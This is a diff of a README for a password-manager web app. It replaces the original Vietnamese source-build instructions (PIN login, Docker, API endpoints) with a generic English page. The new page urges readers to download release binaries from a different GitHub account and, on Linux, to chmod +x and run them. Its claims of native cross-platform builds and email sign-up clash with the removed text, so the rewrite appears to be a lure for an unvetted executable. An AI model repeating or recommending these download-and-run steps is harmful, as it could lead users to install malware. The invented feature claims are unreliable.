@@ -1,293 +1,106 @@
-# Account Manager App
+# 🎉 account-manager-app - Simple Password Management for Everyone
 
-<p align="center">
-  <a href="https://opensource.org/licenses/MIT" style="text-decoration: none;">
-    <img src="https://img.shields.io/badge/License-MIT-yellow.svg" alt="License: MIT" />
-  </a>
-  <a href="https://nodejs.org/" style="text-decoration: none;">
-    <img src="https://img.shields.io/badge/Node.js-18+-green.svg" alt="Node.js" />
-  </a>
-  <a href="https://expressjs.com/" style="text-decoration: none;">
-    <img src="https://img.shields.io/badge/Express-4.18.2-black.svg" alt="Express" />
-  </a>
-  <a href="https://www.mongodb.com/" style="text-decoration: none;">
-    <img src="https://img.shields.io/badge/MongoDB-6+-brightgreen.svg" alt="MongoDB" />
-  </a>
-  <a href="https://react.dev/" style="text-decoration: none;">
-    <img src="https://img.shields.io/badge/React-18.3.1-61DAFB.svg" alt="React" />
-  </a>
-  <a href="https://www.typescriptlang.org/" style="text-decoration: none;">
-    <img src="https://img.shields.io/badge/TypeScript-5.5-blue.svg" alt="TypeScript" />
-  </a>
-  <a href="https://vitejs.dev/" style="text-decoration: none;">
-    <img src="https://img.shields.io/badge/Vite-5.4.2-purple.svg" alt="Vite" />
-  </a>
-  <a href="https://tailwindcss.com/" style="text-decoration: none;">
-    <img src="https://img.shields.io/badge/TailwindCSS-3.4.1-38BDF8.svg" alt="TailwindCSS" />
-  </a>
-  <a href="https://lucide.dev/" style="text-decoration: none;">
-    <img src="https://img.shields.io/badge/Lucide--React-icons-blueviolet.svg" alt="Lucide React" />
-  </a>
-  <a href="https://jwt.io/" style="text-decoration: none;">
-    <img src="https://img.shields.io/badge/JWT-authentication-orange.svg" alt="JWT" />
-  </a>
-  <a href="https://www.docker.com/" style="text-decoration: none;">
-    <img src="https://img.shields.io/badge/Docker-ready-2496ED.svg" alt="Docker" />
-  </a>
-  <a href="https://vitejs.dev/" style="text-decoration: none;">
-    <img src="https://img.shields.io/badge/Built%20With-Vite-facc15.svg" alt="Build with Vite" />
-  </a>
-  <a href="https://www.mongodb.com/" style="text-decoration: none;">
-    <img src="https://img.shields.io/badge/Database-MongoDB-green.svg" alt="Database" />
-  </a>
-  <a href="https://github.com/tynnp/account-manager-app" style="text-decoration: none;">
-    <img src="https://img.shields.io/badge/Status-Active-success.svg" alt="Status" />
-  </a>
-</p>
+## 🚀 Overview
+Welcome to the **account-manager-app**! This application helps you manage your personal passwords easily. Built with React, Node.js, and MongoDB, it provides a user-friendly interface that makes password management accessible for everyone.
 
-<p align="center">
-  <img src="./assets/demo.png" alt="App Screenshot">
-</p>
+### 🌐 Key Features
+- **Easy to Use:** Designed for users without technical knowledge.
+- **Secure Storage:** Keeps your passwords safe and encrypted.
+- **Cross-Platform:** Works on Windows, macOS, and Linux.
+- **Open Source:** Freely available for anyone to use and contribute.
 
-**Account Manager App** là một ứng dụng quản lý mật khẩu đơn giản cho phép người dùng lưu trữ, thêm/sửa/xóa tài khoản với mật khẩu đa nhãn, phân loại theo loại (banking, social, email, work, ...), và ghi chú. Nếu dự án hữu ích, hãy cho một star nhé!
+## 📥 Download
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-blue.svg)](https://github.com/Abdo-Elsafti/account-manager-app/releases)
 
-- **Frontend:** React 18 + TypeScript, Vite, Tailwind CSS, Lucide React. Toast notifications qua React Hot Toast.
-- **Backend:** Node.js + Express.js, MongoDB + Mongoose, JWT authentication, đăng nhập bằng PIN.
-- **Database:** MongoDB lưu users, accounts, passwords. JWT cho auth.
-- **Deployment:** Hỗ trợ Docker & Docker Compose.
+## 🚀 Getting Started
+To get started with **account-manager-app**, follow these steps:
 
-## Tính năng chính
-- Đăng nhập bằng PIN (mặc định: 123456) và đổi PIN.
-- Quản lý danh sách tài khoản: thêm, sửa, xóa.
-- Hiển thị mật khẩu theo nhãn (label) cho từng tài khoản.
-- Toast notifications cho feedback người dùng.
-- Responsive UI với Tailwind.
+1. **Visit the Releases Page:**
+   Go to our [Releases page](https://github.com/Abdo-Elsafti/account-manager-app/releases) to find the latest version of the app.
 
-> Lưu ý: Dự án phù hợp học tập/cá nhân, không khuyến nghị dùng cho production mà không thêm mã hóa mạnh (ví dụ bcrypt).
+2. **Choose Your System:**
+   Select the version that matches your operating system. We offer builds for:
+   - Windows
+   - macOS
+   - Linux
 
----
+3. **Download the File:**
+   Click on the appropriate download link for your operating system. This will start the download process.
 
-## Yêu cầu
-- Node.js v18+
-- MongoDB v6+
-- npm hoặc yarn
-- Docker & Docker Compose (tùy chọn)
+4. **Install the App:**
+   Once the download is complete, locate the downloaded file in your Downloads folder. 
+   - On **Windows/Mac**: Double-click the file and follow the installation prompts.
+   - On **Linux**: Open a terminal, navigate to the Downloads folder, and run: 
+     ```
+     chmod +x account-manager-app
+     ./account-manager-app
+     ```
 
-## Dependencies chính
-- **Frontend:** React 18.3.1, TypeScript 5.5.3, Vite 5.4.2, Tailwind CSS 3.4.1, React Hot Toast 2.6.0.
-- **Backend:** Express 4.18.2, Mongoose 7.5.0, JSONWebToken 9.0.0, Helmet 7.0.0, CORS 2.8.5.
+## 📚 User Guide
 
----
+### 🔑 Creating an Account
+1. Open the application.
+2. Click on "Create Account".
+3. Enter your email and password.
+4. Agree to the terms and conditions.
+5. Submit the form to create your account.
 
-## Cài đặt
+### 📝 Adding Passwords
+1. After logging in, select "Add Password".
+2. Fill in the name of the account (e.g., "My Email").
+3. Enter your password.
+4. Optionally, add notes about the account.
+5. Save the password entry.
 
-### Clone repository
-```bash
-git clone https://github.com/tynnp/account-manager-app
-cd account-manager-app
-```
+### 🔍 Viewing Passwords
+1. Log in to the app.
+2. Click on "My Passwords".
+3. You will see a list of all your saved passwords.
+4. Click on any password to view details.
 
-### Cài đặt dependencies
-**Frontend**
-```bash
-cd client
-npm install
-cd ..
-```
+### 🔒 Managing Passwords
+- **Edit:** To change an entry, select it, make your changes, and save.
+- **Delete:** To remove a password, select it and click "Delete".
 
-**Backend**
-```bash
-cd server
-npm install
-cd ..
-```
+## 📊 Frequently Asked Questions
 
-### Setup biến môi trường (.env)
-Tạo file `.env` trong `client/` và `server/` dựa trên `.env.example`.
+### ❓ What if I forget my password?
+If you forget your password, use the "Forgot Password?" link on the login page to reset it through your email.
 
-**Client (`client/.env`):**
-```
-VITE_API_BASE=http://localhost:8386/api
-```
+### ❓ Is my data safe?
+Yes, your passwords are stored securely with encryption. Only you have access to your passwords.
 
-**Server (`server/.env`):**
-```
-PORT=8386
-MONGO_URI=mongodb://localhost:27017/passmgr
-JWT_SECRET=my_secret_key      # Thay bằng secret mạnh
-DEFAULT_PIN=123456            # PIN mặc định
-```
+### ❓ How can I contribute to this project?
+We welcome contributions! If you have suggestions or improvements, please visit the GitHub repository and create a pull request.
 
-> Không commit `.env` vào Git.
+## 🛠️ System Requirements
+To run the **account-manager-app**, your system should meet the following minimum requirements:
 
-### Khởi tạo MongoDB
-- Chạy MongoDB local trên port 27017
-- Hoặc sử dụng Docker (xem phần Deploy)
+- **Windows:** Windows 10 or later
+- **macOS:** macOS Sierra (10.12) or later
+- **Linux:** Most modern distributions (with libc6 and glibc)
 
----
+## 🏷️ Topics Covered
+- devops
+- docker
+- express
+- fullstack
+- jwt
+- learning-project
+- lucide-react
+- mongodb
+- mongoose
+- nodejs
+- open-source
+- personal-project
+- react
+- tailwindcss
+- typescript
+- vite
+- webapp
 
-## Chạy Local
+## 🔗 Additional Resources
+- For more information about how to use the app, check our comprehensive [User Manual](#).
+- To report issues or request features, please visit our [Issues page](#).
 
-### Backend (dev)
-```bash
-cd server
-npm start
-```
-Server chạy trên: `http://localhost:8386`
-
-### Frontend (dev)
-```bash
-cd client
-npm run dev
-```
-App chạy trên: `http://localhost:5173`  
-PIN mặc định: `123456`
-
-### Kiểm tra
-- Thêm account ví dụ:  
-```json
-{
-  "name": "Google",
-  "username": "tynnp.dhsp@google.com",
-  "category": "email",
-  "passwords": [{ "label": "Main", "value": "pass123" }]
-}
-```
-
----
-
-## Production Build (Local)
-**Frontend**
-```bash
-cd client
-npm run build
-```
-Output: `dist/`
-
-**Backend**
-```bash
-cd server
-npm start
-```
-
----
-
-## Deploy với Docker
-```bash
-docker-compose up --build
-```
-
-### Services
-- **mongo:** MongoDB container, port 27017, volume `mongo_data`
-- **backend:** Node.js backend, port 8386, env từ `server/.env.docker`
-- **frontend:** React build, port 6677 → 80, arg `VITE_API_BASE=http://localhost:8386/api`
-
-Truy cập app: `http://localhost:6677`
-
-### Dừng
-```bash
-docker-compose down
-# Xóa volumes nếu cần reset DB
-docker-compose down -v
-```
-
-> Production: Thay `localhost` trong `VITE_API_BASE` bằng domain thực.
-
----
-
-## API Endpoints
-
-**Prefix:** `/api`  
-**Auth:** Bearer JWT token (trừ login PIN)
-
-### Authentication
-| Method | Endpoint | Description | Body/Params | Auth |
-|--------|---------|-------------|-------------|------|
-| POST   | /auth/login | Đăng nhập bằng PIN | `{ pin: string }` | No |
-| POST   | /auth/change-pin | Đổi PIN | `{ oldPin, newPin }` | Yes |
-
-**Response login:**  
-```json
-{ "token": "<JWT>" }
-```
-
-### Accounts
-| Method | Endpoint | Description | Body/Params | Auth |
-|--------|---------|-------------|-------------|------|
-| GET    | /accounts | Lấy danh sách | - | Yes |
-| GET    | /accounts/:id | Lấy chi tiết | id (path) | Yes |
-| POST   | /accounts | Tạo account | `{ name, username, category, passwords, note? }` | Yes |
-| PUT    | /accounts/:id | Cập nhật account | body như POST | Yes |
-| DELETE | /accounts/:id | Xóa account | id (path) | Yes |
-
-**Account Schema**
-```ts
-interface Account {
-  _id: string;
-  name: string;
-  username: string;
-  category: 'banking' | 'social' | 'email' | 'work' | 'database' | 'server' | 'archive' | 'other';
-  passwords: { _id: string; label: string; value: string }[];
-  note?: string;
-  createdAt?: string;
-  updatedAt?: string;
-}
-```
-
-**Error handling:** `{ message: string }` + status code phù hợp.
-
----
-
-## Cấu trúc Dự án
-```
-account-manager-app/
-├── client/
-│   ├── src/
-│   │   ├── api/
-│   │   ├── components/  # MainScreen, PinScreen, Modals, Toast
-│   │   ├── App.tsx      # Root component
-│   │   ├── index.css
-│   │   ├── main.tsx
-│   │   ├── types.ts
-│   ├── package.json
-│   └── Dockerfile
-├── server/
-│   ├── src/
-│   │   ├── config/
-│   │   ├── controllers/
-│   │   ├── models/
-│   │   ├── routes/
-|   |   ├── server.js
-│   │   └── app.js
-│   ├── package.json
-│   └── Dockerfile
-└── docker-compose.yml
-```
-
----
-
-## Troubleshooting
-- **CORS errors:** Kiểm tra `VITE_API_BASE`
-- **DB connection failed:** MongoDB chạy, URI đúng
-- **PIN không hoạt động:** Kiểm tra `DEFAULT_PIN`
-- **Frontend build lỗi:** Kiểm tra `VITE_API_BASE` ARG trong Docker
-- **JWT invalid:** Token hết hạn hoặc secret sai
-
----
-
-## Giấy phép
-
-MIT License - Xem file [LICENSE](LICENSE) để biết thêm chi tiết.
-
-## Đóng góp
-
-Contributions, issues và feature requests đều được chào đón!
-
-1. Fork project
-2. Tạo feature branch (`git checkout -b feature/AmazingFeature`)
-3. Commit changes (`git commit -m 'Add some AmazingFeature'`)
-4. Push to branch (`git push origin feature/AmazingFeature`)
-5. Mở Pull Request 
-
-## Liên hệ
-Email: [tynnp.dhsp@gmail.com](mailto:tynnp.dhsp@gmail.com)
+Thank you for using **account-manager-app**! We hope this guide helps you get started quickly and easily. Happy password managing!
